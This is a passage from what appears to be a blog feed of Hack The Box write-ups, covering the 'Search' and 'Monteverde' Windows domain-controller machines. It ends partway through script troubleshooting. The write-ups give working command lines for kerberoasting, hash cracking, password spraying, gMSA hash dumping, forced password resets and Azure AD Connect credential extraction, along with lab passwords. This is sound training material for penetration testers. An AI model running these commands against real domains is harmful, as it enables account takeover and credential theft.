<p>We see standard Domain Controller ports (53, 88, 389 &amp; 3269) and <strong>IIS</strong> on ports 80, 443 &amp; 8172</p>

<p>Port 5985 wasn’t open so that meant no <strong>WinRM</strong> for this box</p>

<h3 id="stuff-we-tried-but-didnt-work">Stuff we tried but didn’t work</h3>
<ol>
  <li><strong>SMB</strong> enumeration using anonymous, guest and null sessions.</li>
  <li><strong>RPC</strong> enumeration with <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>.</li>
  <li><strong>LDAP</strong> enumeration with <code class="language-plaintext highlighter-rouge">ldapsearch</code> using anonymous authentication.</li>
  <li>Collecting usernames from the website and trying them. We got 3 valid users. But none of them was <strong>ASREPRoastable</strong> or had a weak password.</li>
  <li>Web Directory Bruteforcing. The only unique directory was <code class="language-plaintext highlighter-rouge">/staff</code> but we got access denied. We also did file bruteforcing with multiple extensions without much success.</li>
  <li>Viewing the source code for the accessible web pages.</li>
  <li>Checking for <strong>Virtual Host Routing</strong>.</li>
</ol>

<p>All of those didn’t yield any results. However..</p>

<h3 id="when-you-use-a-magnifying-glass">When you use a magnifying glass..</h3>
<p><em>when looking really close at one of the images on the website,</em> something is there!</p>

<p><img src="/assets/Search/secret-image-small.jpg" alt="secret-image-small" /></p>

<p>The text was very small. so we had to open up the image in a new tab and zoom in to find what’s written:</p>

<p><img src="/assets/Search/secret-image-up-close.jpg" alt="secret-image-up-close" /></p>

<p>It said: <strong>“Send password to Hope Sharp”</strong> then <strong>“IsolationIsKey?”</strong></p>

<h3 id="first-set-of-credentials">First set of credentials</h3>
<p><em>Earlier,</em> when extracted usernames from the website:</p>

<p><img src="/assets/Search/website-users-2.jpg" alt="website-users" /></p>

<p>we used a python tool called <a href="/assets/Search/https://github.com/w0Tx/generate-ad-username"><code class="language-plaintext highlighter-rouge">ADGenerator</code></a> to generate a list of usernames based on their first and last names following common naming conventions:</p>

<ul>
  <li>NameSurname</li>
  <li>Name.Surname</li>
  <li>NamSur (3letters of each)</li>
  <li>Nam.Sur</li>
  <li>NSurname</li>
  <li>N.Surname</li>
  <li>SurnameName</li>
  <li>Surname.Name</li>
  <li>SurnameN</li>
  <li>Surname.N</li>
</ul>

<p>and we used a tool called <a href="/assets/Search/https://github.com/ropnop/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a> to enumerate which were valid users using the <code class="language-plaintext highlighter-rouge">userenum</code> module.</p>

<p><img src="/assets/Search/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>

<p><em>From that,</em> we know that the username convention is <strong>Name.Surname</strong></p>

<p>We went ahead and found the password <strong>“IsolationIsKey?”</strong> to work with <strong>“Hope.Sharp”</strong></p>

<p><img src="/assets/Search/auth-as-hope-sharp.jpg" alt="auth-as-hope-sharp" /></p>

<h3 id="the-awesomeness-of-bloodhound">The Awesomeness of BloodHound</h3>
<p><em>Since port 5985 isn’t open,</em> we have no reason to check for <strong>WinRM</strong> capabilities. So we turn to using all the tools that don’t require a foothold on the box.</p>

<p>We start with <a href="/assets/Search/https://github.com/fox-it/BloodHound.py"><code class="language-plaintext highlighter-rouge">BloodHound.py</code></a> to get an overview of the situation in the domain.</p>

<p><strong>Note:</strong> it’s recommended to set your <strong>DNS</strong> server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> to the box’s IP to make sure things go smoothly when using any of the tools we’re about to use.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 bloodhound.py <span class="nt">-d</span> search.htb <span class="nt">-dc</span> research.search.htb <span class="nt">-u</span> hope.sharp <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span>
</code></pre></div></div>

<p><img src="/assets/Search/bloodhound-py.jpg" alt="bloodhound-py" /></p>

<p><em>When checking the output of the</em> <code class="language-plaintext highlighter-rouge">ShortestPath to High Value Targets</code>, we see a <strong>clear path</strong> to owning the domain:</p>

<p><img src="/assets/Search/clear-path-to-DA.jpg" alt="clear-path-to-DA" /></p>

<p>We would first have to make our way to any of users on the left within the <code class="language-plaintext highlighter-rouge">ITSEC</code> group.</p>

<p><em>In another</em> <code class="language-plaintext highlighter-rouge">BloodHound</code> <em>query for kerberoastable accounts</em>, we find we can attack <code class="language-plaintext highlighter-rouge">WEB_SVC</code>:</p>

<p><img src="/assets/Search/web-svc-kerberoastable.jpg" alt="web-svc-kerberoastable" /></p>

<h3 id="kerberoasting-web_svc">Kerberoasting <code class="language-plaintext highlighter-rouge">web_svc</code></h3>
<p>we use impacket’s <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code></p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 GetUserSPNs.py <span class="nt">-debug</span> <span class="nt">-request</span> <span class="nt">-dc-ip</span> 10.10.11.129 search.htb/hope.sharp:<span class="s1">'IsolationIsKey?'</span>
</code></pre></div></div>

<p><img src="/assets/Search/kerberoasted.jpg" alt="kerberoasted" /></p>

<p>And we crack the password using <code class="language-plaintext highlighter-rouge">john</code></p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john web_svc_hash <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
</code></pre></div></div>

<p><img src="/assets/Search/cracked-with-john.jpg" alt="cracked-with-john" /></p>

<p>The password was <strong>“@3ONEmillionbaby”</strong></p>

<h3 id="checking-for-password-reuse">Checking for Password Reuse</h3>
<p>It has turned into a habit for me to spray any password I get on all possible users xD</p>

<p><em>In order to get a the full list of domain users,</em> I use <code class="language-plaintext highlighter-rouge">crackmapexec</code> with the <code class="language-plaintext highlighter-rouge">--users</code> flag.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'web_svc'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--users</span>
</code></pre></div></div>

<p><img src="/assets/Search/cme-full-userlist.jpg" alt="cme-full-userlist" /></p>

<p>We find out that another user had been user the same password <strong>“@3ONEmillionbaby”</strong></p>

<p><img src="/assets/Search/edgar-reusing.jpg" alt="edgar-reusing" /></p>

<h3 id="enumerating-smb-access-for-edgar">Enumerating SMB access for Edgar</h3>
<p>We use <code class="language-plaintext highlighter-rouge">crackmapexec</code>’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module to get a <em>nicely-formatted</em> <strong>JSON</strong> output for <code class="language-plaintext highlighter-rouge">edgar</code>’s share access.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">-M</span> spider_plus
</code></pre></div></div>

<p>We notice something interesting in the results:</p>

<p><img src="/assets/Search/interesting-document-found.jpg" alt="interesting-document-found" /></p>

<p>we use <code class="language-plaintext highlighter-rouge">smbclient</code> to fetch the file:</p>

<p><img src="/assets/Search/getting-the-sheet.jpg" alt="getting-the-sheet" /></p>

<p><em>After opening the document with</em> <strong>Microsoft Office’s Excel</strong> <em>and looking into the second tab of the workbook,</em> we notice a hidden column: <strong>C</strong></p>

<p><img src="/assets/Search/hidden-column.jpg" alt="hidden-column" /></p>

<p>We won’t be able to <strong>unhide</strong> this column unless we <strong>unprotect</strong> the sheet:</p>

<p><img src="/assets/Search/unprotecting-sheet.jpg" alt="unprotecting-sheet" /></p>

<p><em>We can, however,</em> use the trick of uploading the <code class="language-plaintext highlighter-rouge">xlsx</code> file to <strong>Google Sheets</strong> :D</p>

<p><img src="/assets/Search/got-them-passwords.jpg" alt="got-them-passwords" /></p>

<p><strong>PROFIT! :D</strong></p>

<h3 id="access-as-sierra">Access as Sierra</h3>
<p><em>When using the obtained passwords throughout the domain,</em> we gain access to <code class="language-plaintext highlighter-rouge">seirra.frye</code></p>

<p><img src="/assets/Search/got-sierra.jpg" alt="got-sierra" /></p>

<p>and since <code class="language-plaintext highlighter-rouge">sierra</code> is a member of the <code class="language-plaintext highlighter-rouge">ITSEC</code> group, we’re going to go for a full domain takeover!</p>

<p><img src="/assets/Search/path-to-da.jpg" alt="path-to-da" /></p>

<h3 id="reading-the-gmsa-password--resetting-tristans-password">Reading the GMSA password &amp; Resetting <code class="language-plaintext highlighter-rouge">tristan</code>’s password</h3>
<p>We can obtain the <strong>NTLM</strong> hash of the <strong>GMSA</strong> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> with a <strong>python</strong> tool called <a href="/assets/Search/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 gMSADumper.py <span class="nt">-u</span> Sierra.Frye <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">-d</span> search.htb
</code></pre></div></div>

<p><img src="/assets/Search/got-gmsa-ntlm.jpg" alt="got-gmsa-ntlm" /></p>

<p>What’s left is to reset the password for <code class="language-plaintext highlighter-rouge">tristan</code> which we can do through <code class="language-plaintext highlighter-rouge">rpcclient</code> using the <code class="language-plaintext highlighter-rouge">--pw-nt-hash</code> to pass the hash.</p>

<p>then following with the <code class="language-plaintext highlighter-rouge">setuserinfo2</code> command making sure our password satisfies the complexity requirements.</p>

<p>and finishing with <strong>impacket</strong>’s <code class="language-plaintext highlighter-rouge">wmiexec.py</code> to get full shell access.</p>

<p><img src="/assets/Search/got-tristan.jpg" alt="got-tristan" /></p>

<h3 id="an-alternate-route-cracking-the-pfx-certificate-on-sierras-share--using-it-for-powershell-web-access">An Alternate Route: cracking the <code class="language-plaintext highlighter-rouge">.pfx</code> certificate on <code class="language-plaintext highlighter-rouge">sierra</code>’s share + using it for PowerShell web access</h3>
<p><em>If we take some time to check</em> <code class="language-plaintext highlighter-rouge">sierra</code>’s <em>profile,</em> we see a file called <code class="language-plaintext highlighter-rouge">staff.pfx</code> in the <code class="language-plaintext highlighter-rouge">\Downloads\Backups</code> folder:</p>

<p><img src="/assets/Search/pfx-found.jpg" alt="pfx-found" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">john</code>’s python utility script <code class="language-plaintext highlighter-rouge">pfx2john</code>, we can get a format that’s crackable.</p>

<p><img src="/assets/Search/cracked-pfx.jpg" alt="cracked-pfx" /></p>

<p>We can import these certificates into <code class="language-plaintext highlighter-rouge">firefox</code></p>

<p><img src="/assets/Search/firefox-cert-import.jpg" alt="firefox-cert-import" /></p>

<p><em>After importing the certificates,</em> we can browse to <code class="language-plaintext highlighter-rouge">https://10.10.11.129/staff</code></p>

<p><img src="/assets/Search/powershell-web-access.jpg" alt="powershell-web-access" /></p>

<p>we get a nice web terminal after authenticating:</p>

<p><img src="/assets/Search/powershell-web-terminal.jpg" alt="powershell-web-terminal" /></p>

<p><em>In order to be able to run code as</em> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA</code>, we’re going to do a couple of things:</p>

<ol>
  <li>Obtain the <strong>GMSA</strong> password as a secure string. This can be done with the below command:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$secstringpassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="p">(</span><span class="n">get-adserviceaccount</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">msDS-ManagedPassword</span><span class="p">)</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="p">)</span><span class="o">.</span><span class="nf">SecureCurrentPassword</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Create a <code class="language-plaintext highlighter-rouge">PSCredential</code> object with both the <strong>GMSA</strong> username and the secure string.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">BIR-ADFS-GMSA</span><span class="p">,</span><span class="w"> </span><span class="nv">$secstringpassword</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Execute a password reset command using the created <code class="language-plaintext highlighter-rouge">PSCredential</code>:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">tristan.davies</span><span class="w"> </span><span class="nt">-reset</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)}</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="nv">$Script</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Create another <code class="language-plaintext highlighter-rouge">PSCredential</code> object but with <code class="language-plaintext highlighter-rouge">tristan</code>’s new password:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$killercreds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">Tristan.Davies</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Execute commands as <code class="language-plaintext highlighter-rouge">tristan</code> using the new credential object:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$killercreds</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ol>

<p><img src="/assets/Search/tristan-web-access.jpg" alt="tristan-web-access" /></p>

<p>And this wraps up the path :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Monteverde</title><link href="https://omnisl4sh.github.io/2022/06/24/Monteverde.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Monteverde" /><published>2022-06-24T00:00:00+02:00</published><updated>2022-06-24T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/24/Monteverde</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/24/Monteverde.html"><![CDATA[<p><img src="/assets/Monteverde/Monteverde.png" alt="Monteverde" /></p>

<h3 id="summary">Summary</h3>
<ul>
  <li>Another Windows Domain Controller Machine.</li>
  <li>We get a full list of domain users by enumerating <strong>RPC</strong> and are able to login with a user called <code class="language-plaintext highlighter-rouge">SABatchJobs</code> whose password was his own username.</li>
  <li><em>Enumerating the</em> <strong>SMB</strong> <em>access for this user,</em> we find that he could read a certain <strong>XML</strong> file which contained a password.</li>
  <li><em>After spraying the password over all users,</em> it turns out to belong to another user called <code class="language-plaintext highlighter-rouge">mhope</code> who happens to have <strong>PowerShell Remoting</strong> access and who’s a member of the <code class="language-plaintext highlighter-rouge">Azure Admins</code> AD group. Which was interesting.</li>
  <li><em>Additionally,</em> we found a special folder called <code class="language-plaintext highlighter-rouge">.Azure</code> in <code class="language-plaintext highlighter-rouge">mhope</code>’s user profile. It contained remnants of a connection made to <strong>Azure</strong>.</li>
  <li>We also find <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> installed in the <code class="language-plaintext highlighter-rouge">C:\Program Files</code> directory which all stuck out and brought our attention to search for <strong>Privilege Escalation</strong> paths along that way.</li>
  <li><em>Searching</em> <strong>Google</strong> <em>for</em> <code class="language-plaintext highlighter-rouge">Privilege Escalation Using Azure AD Connect</code>, we find a <strong>blog post</strong> that gives us a bit of background on what <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> does and how to exploit it to gain <strong>Domain Admin</strong> privileges.</li>
  <li><em>Since</em> <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> <em>uses an account to sync passwords between the</em> <strong>On-prem Active Directory</strong> <em>and the</em> <strong>Azure Instance</strong>, this account must be granted <code class="language-plaintext highlighter-rouge">DCSync</code> rights for the functionality to work.</li>
  <li>The credentials for this account are stored within the local <strong>MSSQL</strong> database that’s included in the installation of <code class="language-plaintext highlighter-rouge">Azure AD Connect</code>. <em>Even thought they are encrypted,</em> their decryption keys are also present on the same database.</li>
  <li><em>Since our user</em> <code class="language-plaintext highlighter-rouge">mhope</code> <em>had access to that local DB,</em> We were able to extract and decrypt those credentials after doing a few tweaks to the <strong>PowerShell</strong> script provided by the blog author.</li>
  <li>They turn out to be the <strong>Domain Administrator</strong>’s creds and we root the box.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>No special scan here. Just the standard <code class="language-plaintext highlighter-rouge">nmap</code> with <code class="language-plaintext highlighter-rouge">-sC</code> for default scripts and <code class="language-plaintext highlighter-rouge">-sV</code> for version detection on all ports.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-23 17:15:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-server-header: Microsoft-HTTPAPI/2.0
| http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-23T17:16:47
|_  start_date: N/A
</code></pre></div></div>

<p>We notice it’s a <strong>Windows</strong> box with few ports indicative of a <strong>Domain Controller</strong>: <strong>DNS</strong> on tcp 53, <strong>Kerberos</strong> on tcp 88 and <strong>LDAP</strong> on tcp 389.</p>

<p>The domain name is <strong>MEGABANK.LOCAL</strong> and the hostname is <strong>MONTEVERDE</strong></p>

<p>We also have <strong>WinRM</strong> open on tcp 5985 which would be handy to get remote code execution for any user present in either <strong>Administrators</strong> or <strong>Remote Management Users</strong> local groups.</p>

<h3 id="username-enumeration">Username Enumeration</h3>
<p><em>Using a tool called</em> <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>, we are able to get a list of usernames via <code class="language-plaintext highlighter-rouge">RPC</code>:</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linx-ng <span class="nt">-A</span> 10.10.10.172
</code></pre></div></div>

<p><img src="/assets/Monteverde/enum4linux-ng-output.jpg" alt="enum4linux-ng-output" /></p>

<p>No interesting info was in the description except for one user: <code class="language-plaintext highlighter-rouge">AAD_987d7f2f57d2</code></p>

<p>It said: <code class="language-plaintext highlighter-rouge">Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.</code></p>

<p>This hinted at the possibility that this account might have <strong>DCSync</strong> rights. <em>If that was true,</em> then getting access as that user would mean game over :D</p>

<p>We take note of that and get the <strong>Domain Password Policy</strong> from the output as well.</p>

<p><img src="/assets/Monteverde/password-policy.jpg" alt="password-policy" /></p>

<p><em>With no account lockout configured,</em> we can spray like there’s no tomorrow :D</p>

<h3 id="asreproasting-then-password-spraying">ASREPRoasting then Password Spraying</h3>
<p><em>Since</em> <strong>ASREPRoasting</strong> <em>is the first thing to do with a userlist,</em> we tried it but weren’t awarded with any hashes. So we turned to <strong>Password Spraying</strong>.</p>

<p>We make a quick list of common passwords to try like ‘P@ssw0rd’, ‘Welcome1’ etc. but don’t get anything :/</p>

<p>So we try using the usernames themselves as passwords. We do so using <code class="language-plaintext highlighter-rouge">hydra</code> and we get a hit!</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-e</span> s <span class="nt">-L</span> users.txt ldap3://10.10.10.172 <span class="nt">-v</span>
</code></pre></div></div>

<p>where the <code class="language-plaintext highlighter-rouge">-e</code> flag with the <code class="language-plaintext highlighter-rouge">s</code> argument is the part instructing <code class="language-plaintext highlighter-rouge">hydra</code> to use the same entry for both username and password.</p>

<p><img src="/assets/Monteverde/hydra-attack.jpg" alt="hydra-attack" /></p>

<h3 id="smb-access">SMB Access</h3>
<p>After we verify that <code class="language-plaintext highlighter-rouge">SABatchJobs</code> doesn’t have <strong>WinRM</strong> access, we enumerate <strong>SMB</strong> as him using <code class="language-plaintext highlighter-rouge">crackmapexec</code>’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module.</p>

<p>This module does as the name suggests: it <em>recursively</em> spiders <strong>SMB</strong> shares and outputs the results in a temp folder.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.172 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> SABatchJobs <span class="nt">-M</span> spider_plus
</code></pre></div></div>

<p><img src="/assets/Monteverde/cme-spiderplus.jpg" alt="cme-spiderplus" /></p>

<p><em>Looking at the results in the output</em> <strong>JSON</strong> <em>file,</em> we notice a very interesting file: <code class="language-plaintext highlighter-rouge">azure.xml</code> which existed in the <code class="language-plaintext highlighter-rouge">users</code> share under the folder for the <code class="language-plaintext highlighter-rouge">mhope</code> user:</p>

<p><img src="/assets/Monteverde/azure-xml-file.jpg" alt="azure-xml-file" /></p>

<p>We connect to the share with <code class="language-plaintext highlighter-rouge">smbclient</code> and download the file to view its contents:</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.172/users<span class="nv">$ </span><span class="nt">-U</span> SABatchJobs
</code></pre></div></div>

<p>and we get a password!</p>

<p><img src="/assets/Monteverde/mhope-password.jpg" alt="mhope-password" /></p>

<h3 id="shell-access-as-mhope">Shell Access as <code class="language-plaintext highlighter-rouge">mhope</code></h3>
<p><em>After getting this password,</em> we immediately spray it over the domain users. We find that it’s valid and that we have <strong>WinRM</strong> access as well!</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.172 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span> <span class="nt">--continue-on-success</span>
</code></pre></div></div>

<p><strong>Note:</strong> we used the <code class="language-plaintext highlighter-rouge">--continue-on-success</code> to be able to take advantage of any password reuse.</p>

<p><img src="/assets/Monteverde/winrm-as-mhope.jpg" alt="winrm-as-mhope" /></p>

<p>We login using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to get a <strong>PowerShell</strong> session on the box:</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.172 <span class="nt">-u</span> mhope <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>
</code></pre></div></div>

<p><img src="/assets/Monteverde/evil-winrm-access.jpg" alt="evil-winrm-access" /></p>

<h3 id="enumeration-before-privesc">Enumeration before Privesc</h3>
<p>Running a quick <code class="language-plaintext highlighter-rouge">whoami /groups</code> command shows that we are in an AD group called <code class="language-plaintext highlighter-rouge">Azure Admins</code></p>

<p><img src="/assets/Monteverde/ad-group-membership.jpg" alt="ad-group-membership" /></p>

<p>We also notice a strange folder on <code class="language-plaintext highlighter-rouge">mhope</code>’s user profile.</p>

<p><img src="/assets/Monteverde/dot-azure-folder.jpg" alt="dot-azure-folder" /></p>

<p>And in the <code class="language-plaintext highlighter-rouge">c:\Program Files</code> directory, we find a whole bunch of software relevant to <strong>Azure AD Sync</strong></p>

<p><img src="/assets/Monteverde/program-files.jpg" alt="program-files" /></p>

<p><em>Right now,</em> our senses are <em>tingling</em>. <em>Because,</em> we had a lot of signs along the way that are pointing towards this area:</p>
<ol>
  <li>the <code class="language-plaintext highlighter-rouge">AAD_987d7f2f57d2</code> user</li>
  <li>the <code class="language-plaintext highlighter-rouge">azure.xml</code> file</li>
  <li>the <code class="language-plaintext highlighter-rouge">Azure Admins</code> group membership</li>
  <li>the <code class="language-plaintext highlighter-rouge">.Azure</code> folder</li>
  <li>the Azure related software in <code class="language-plaintext highlighter-rouge">Program Files</code></li>
</ol>

<p>So we go ahead and do some googling :D</p>

<h3 id="research">Research</h3>
<p>We decide to use a broad term in our first search to make things easier for ourselves. We type in: “Azure AD Sync Privilege Escalation”</p>

<p>and we get this awesome blog post <a href="/assets/Monteverde/https://blog.xpnsec.com/azuread-connect-for-redteam/">here</a>:</p>

<p><img src="/assets/Monteverde/privesc-blog.jpg" alt="privesc-blog" /></p>

<p><em>Reading the post,</em> we learn that <strong>Azure AD Connect</strong> is: a tool for <em>integrating between</em> both <strong>On-Prem Active Directory Deployments</strong> and <strong>Azure AD</strong>.</p>

<p>It has the <strong>Password Hash Syncronization (PHS)</strong> feature which “<em>uploads user accounts and password hashes from Active Directory to Azure</em>”.</p>

<p>We also learn that: <em>during the setup,</em> an <strong>AD account</strong> is used to perform the sync process. And is granted the <strong>necessary permissions</strong> to be able to access all the <strong>domain hashes</strong>.</p>

<p>One more thing we notice: is that the credentials for the synchronization account are <strong>found on the local database</strong> included in the installation process.</p>

<p><em>And, even though they are encrypted,</em> the key to <strong>decrypt</strong> them is also present on the same database.</p>

<h3 id="trying-the-powershell-script">Trying the PowerShell Script</h3>
<p>The researcher and blog author <strong>“Adam Chester”</strong> had thankfully created a script that takes care of all the above and dumps us the stored credentials <em>if we had access to the database.</em></p>

<p>We’re going to use a brief command to try connecting to the local database to see if we can query it: <code class="language-plaintext highlighter-rouge">sqlcmd -Q "SELECT name FROM master.dbo.sysdatabases"</code></p>

<p>Seems like we do!</p>

<p><img src="/assets/Monteverde/database-access.jpg" alt="database-access" /></p>

<p><em>After using the script,</em> we notice that it runs. But it stops right after it prints its banner and we lose our shell.</p>

<p><img src="/assets/Monteverde/script-fail.jpg" alt="script-fail" /></p>

<h3 id="troubleshooting">Troubleshooting</h3>
<p><em>Since the script isn’t big (&lt; 40 lines)</em>, It wouldn’t be difficult to step through it line-by-line to find out what’s wrong.</p>

<p>we take a look at the first 5 lines:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"AD Connect Sync Credential Extract POC (@_xpn_)</span><span class="se">`n</span><span class="s2">"</span><span class="w">

</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</span><span class="w">
</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Open</span><span class="p">()</span><span class="w">
</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">

</span></code></pre></div></div>

<p>And start by running the part which defines how the script will connect to the database a.k.a the <strong>“connection string”</strong>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</span><span class="w">
</span></code></pre></div></div>

